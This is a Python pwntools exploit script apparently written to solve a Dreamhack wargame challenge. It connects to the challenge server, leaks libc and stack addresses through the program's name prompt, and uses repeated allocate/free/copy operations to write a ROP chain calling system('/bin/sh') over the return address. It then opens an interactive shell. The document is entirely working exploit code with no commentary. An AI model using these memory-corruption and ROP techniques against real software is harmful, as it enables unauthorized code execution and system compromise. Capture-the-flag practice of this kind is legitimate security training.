from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 13520
r = remote(HOST, PORT)

def make(num, sz, data):
    r.sendlineafter(b'>> ', b'1')
    r.sendlineafter(b'>> ', b'%d'%num)
    r.sendlineafter(b'>> ', b'%d'%sz)
    r.sendafter(b'>> ', data)

def copy(src, des):
    r.sendlineafter(b'>> ', b'2')
    r.sendlineafter(b'>> ', b'%d'%src)
    r.sendlineafter(b'>> ', b'%d'%des)

def remove(num):
    r.sendlineafter(b'>> ', b'3')
    r.sendlineafter(b'>> ', b'%d'%num)

def rename(name):
    r.sendlineafter(b'>> ', b'4')
    r.sendafter(b'>> ', name)

def exit():
    r.sendlineafter(b'>> ', b'5')

r.sendafter(b'name?\n', b'A')
r.recvuntil(b'A')

libc = (u64(r.recvuntil(b', ', drop=True).ljust(8, b'\x00')) << 8) - 0x1f0f00
pop_rdi = libc + 0x26b72
binsh = libc + 0x1b75aa
system = libc + 0x55410
ret = libc + 0x25679

rename(b'A'*0x20)
r.recvuntil(b'A'*0x20)
buf = u64(r.recvline().strip().ljust(8, b'\x00')) - 0x120
rip = buf + 0x38

payload = [
    ret,
    pop_rdi, binsh,
    system
]

for i in range(4):
    make(0, 0x100, b'A')
    make(1, 0x100, b'A')

    remove(0)
    remove(1)

    make(2, 0x10, p32(0) + p32(8) + p64(rip+8*i))
    make(3, 0x100, p64(payload[i]))

    copy(3, 0)

exit()

r.interactive()